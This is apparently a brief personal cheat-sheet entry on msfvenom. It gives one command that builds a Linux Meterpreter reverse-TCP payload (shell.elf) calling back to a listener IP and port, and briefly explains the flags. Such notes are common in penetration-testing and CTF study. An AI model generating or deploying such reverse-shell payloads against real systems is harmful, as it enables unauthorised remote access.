---
title: "msfvenom"
tags:
  - fetus
---
## usage:
```sh
msfvenom -p linux/x86/meterpreter_reverse_tcp -f elf -o shell.elf LHOST=10.21.154.145 LPORT=1338
```
- `-p`: sets the payload
- `-f`: sets the file type
- `-o`: specifies the output name
- `LHOST` and `LPORT` are self explanatory tbh :v